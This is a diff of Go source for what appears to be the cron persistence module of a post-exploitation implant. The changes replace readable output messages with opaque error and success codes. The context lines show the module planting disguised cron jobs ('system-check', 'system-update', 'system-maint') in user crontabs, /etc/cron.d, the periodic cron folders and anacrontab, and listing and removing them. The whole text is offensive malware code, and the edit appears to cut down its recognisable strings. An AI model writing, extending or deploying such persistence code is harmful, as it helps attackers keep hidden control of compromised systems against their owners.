@@ -26,7 +26,7 @@ func (c *CronPersistenceCommand) Name() string {
 func (c *CronPersistenceCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 	if len(args) < 1 {
 		return CommandResult{
-			Output: "Usage: persist-cron <action> [options]",
+			Output:   Err(E1),
 			ExitCode: 1,
 		}
 	}
@@ -41,7 +41,7 @@ func (c *CronPersistenceCommand) Execute(ctx *CommandContext, args []string) Com
 		return c.listCronPersistence()
 	default:
 		return CommandResult{
-			Output:   fmt.Sprintf("Unknown action: %s", action),
+			Output:   ErrCtx(E21, action),
 			ExitCode: 1,
 		}
 	}
@@ -85,7 +85,7 @@ func (c *CronPersistenceCommand) addCronPersistence(args []string) CommandResult
 		currentUser, err := user.Current()
 		if err != nil {
 			return CommandResult{
-				Output:   fmt.Sprintf("Failed to get current user: %v", err),
+				Output:   Err(E19),
 				ExitCode: 1,
 			}
 		}
@@ -140,14 +140,14 @@ func (c *CronPersistenceCommand) addCronPersistence(args []string) CommandResult
 		}
 	default:
 		return CommandResult{
-			Output:   fmt.Sprintf("Unknown method: %s. Use: spool, crond, periodic, anacron, or all", method),
+			Output:   ErrCtx(E21, method),
 			ExitCode: 1,
 		}
 	}
 
 	if len(results) == 0 {
 		return CommandResult{
-			Output:   fmt.Sprintf("Failed to add cron persistence via method: %s", method),
+			Output:   ErrCtx(E11, method),
 			ExitCode: 1,
 		}
 	}
@@ -188,7 +188,7 @@ func (c *CronPersistenceCommand) addViaSpoolCron(username, interval, command str
 			existingContent = content
 			// Check if already added
 			if strings.Contains(string(content), command) {
-				return fmt.Sprintf("[-] Cron job already exists in %s", cronPath)
+				return ErrCtx(E5, cronPath)
 			}
 		}
 
@@ -197,7 +197,7 @@ func (c *CronPersistenceCommand) addViaSpoolCron(username, interval, command str
 
 		// Write back
 		if err := os.WriteFile(cronPath, newContent, 0600); err == nil {
-			return fmt.Sprintf("[+] Added cron job to %s", cronPath)
+			return SuccCtx(S1, cronPath)
 		}
 	}
 
@@ -222,7 +222,7 @@ func (c *CronPersistenceCommand) addViaCronD(username, interval, command string)
 
 	// Write file
 	if err := os.WriteFile(filename, []byte(cronContent), 0644); err == nil {
-		return fmt.Sprintf("[+] Created cron job in %s", filename)
+		return SuccCtx(S1, filename)
 	}
 
 	return ""
@@ -261,7 +261,7 @@ func (c *CronPersistenceCommand) addViaCronDirectories(command, interval string)
 	scriptContent := fmt.Sprintf("#!/bin/bash\n%s\n", command)
 
 	if err := os.WriteFile(scriptName, []byte(scriptContent), 0755); err == nil {
-		return fmt.Sprintf("[+] Created cron script in %s", scriptName)
+		return SuccCtx(S1, scriptName)
 	}
 
 	return ""
@@ -284,7 +284,7 @@ func (c *CronPersistenceCommand) addViaAnacron(command string) string {
 
 	// Check if already added
 	if strings.Contains(string(content), command) {
-		return "[-] Anacron job already exists"
+		return Err(E5)
 	}
 
 	// Add anacron entry (runs daily with 5 minute delay)
@@ -292,7 +292,7 @@ func (c *CronPersistenceCommand) addViaAnacron(command string) string {
 	newContent := append(content, []byte(anacronEntry)...)
 
 	if err := os.WriteFile(anacronTab, newContent, 0644); err == nil {
-		return "[+] Added anacron job to /etc/anacrontab"
+		return SuccCtx(S1, anacronTab)
 	}
 
 	return ""
@@ -369,14 +369,14 @@ func (c *CronPersistenceCommand) removeCronPersistence(args []string) CommandRes
 		}
 		for _, cronPath := range cronPaths {
 			if err := c.cleanCronFile(cronPath); err == nil {
-				results = append(results, fmt.Sprintf("[+] Cleaned %s", cronPath))
+				results = append(results, SuccCtx(S2, cronPath))
 			}
 		}
 
 	case "crond":
 		// Remove from /etc/cron.d/
 		if err := os.Remove("/etc/cron.d/system-check"); err == nil {
-			results = append(results, "[+] Removed /etc/cron.d/system-check")
+			results = append(results, SuccCtx(S2, "/etc/cron.d/system-check"))
 		}
 
 	case "periodic":
@@ -384,14 +384,14 @@ func (c *CronPersistenceCommand) removeCronPersistence(args []string) CommandRes
 		for _, dir := range []string{"/etc/cron.hourly", "/etc/cron.daily", "/etc/cron.weekly", "/etc/cron.monthly"} {
 			scriptPath := filepath.Join(dir, "system-update")
 			if err := os.Remove(scriptPath); err == nil {
-				results = append(results, fmt.Sprintf("[+] Removed %s", scriptPath))
+				results = append(results, SuccCtx(S2, scriptPath))
 			}
 		}
 
 	case "anacron":
 		// Clean anacrontab
 		if err := c.cleanAnacron(); err == nil {
-			results = append(results, "[+] Cleaned anacrontab")
+			results = append(results, SuccCtx(S2, "/etc/anacrontab"))
 		}
 
 	case "all":
@@ -403,7 +403,7 @@ func (c *CronPersistenceCommand) removeCronPersistence(args []string) CommandRes
 		}
 		for _, cronPath := range cronPaths {
 			if err := c.cleanCronFile(cronPath); err == nil {
-				results = append(results, fmt.Sprintf("[+] Cleaned %s", cronPath))
+				results = append(results, SuccCtx(S2, cronPath))
 			}
 		}
 
@@ -412,24 +412,24 @@ func (c *CronPersistenceCommand) removeCronPersistence(args []string) CommandRes
 		for _, dir := range []string{"/etc/cron.hourly", "/etc/cron.daily", "/etc/cron.weekly", "/etc/cron.monthly"} {
 			scriptPath := filepath.Join(dir, "system-update")
 			if err := os.Remove(scriptPath); err == nil {
-				results = append(results, fmt.Sprintf("[+] Removed %s", scriptPath))
+				results = append(results, SuccCtx(S2, scriptPath))
 			}
 		}
 
 		if err := c.cleanAnacron(); err == nil {
-			results = append(results, "[+] Cleaned anacrontab")
+			results = append(results, SuccCtx(S2, "/etc/anacrontab"))
 		}
 
 	default:
 		return CommandResult{
-			Output:   fmt.Sprintf("Unknown method: %s. Use: spool, crond, periodic, anacron, or all", method),
+			Output:   ErrCtx(E21, method),
 			ExitCode: 1,
 		}
 	}
 
 	if len(results) == 0 {
 		return CommandResult{
-			Output:   fmt.Sprintf("No cron persistence found to remove for method: %s", method),
+			Output:   ErrCtx(E4, method),
 			ExitCode: 1,
 		}
 	}
@@ -501,7 +501,7 @@ func (c *CronPersistenceCommand) listCronPersistence() CommandResult {
 		for _, path := range cronPaths {
 			if content, err := os.ReadFile(path); err == nil {
 				if strings.Contains(string(content), "Added by system at") {
-					results = append(results, fmt.Sprintf("[+] Found persistence in %s", path))
+					results = append(results, SuccCtx(S6, path))
 				}
 			}
 		}
@@ -509,27 +509,27 @@ func (c *CronPersistenceCommand) listCronPersistence() CommandResult {
 
 	// Check /etc/cron.d/
 	if _, err := os.Stat("/etc/cron.d/system-check"); err == nil {
-		results = append(results, "[+] Found persistence in /etc/cron.d/system-check")
+		results = append(results, SuccCtx(S6, "/etc/cron.d/system-check"))
 	}
 
 	// Check cron directories
 	for _, dir := range []string{"/etc/cron.hourly", "/etc/cron.daily", "/etc/cron.weekly", "/etc/cron.monthly"} {
 		scriptPath := filepath.Join(dir, "system-update")
 		if _, err := os.Stat(scriptPath); err == nil {
-			results = append(results, fmt.Sprintf("[+] Found persistence in %s", scriptPath))
+			results = append(results, SuccCtx(S6, scriptPath))
 		}
 	}
 
 	// Check anacrontab
 	if content, err := os.ReadFile("/etc/anacrontab"); err == nil {
 		if strings.Contains(string(content), "system-maint") {
-			results = append(results, "[+] Found persistence in /etc/anacrontab")
+			results = append(results, SuccCtx(S6, "/etc/anacrontab"))
 		}
 	}
 
 	if len(results) == 0 {
 		return CommandResult{
-			Output:   "No cron persistence found",
+			Output:   Err(E4),
 			ExitCode: 0,
 		}
 	}
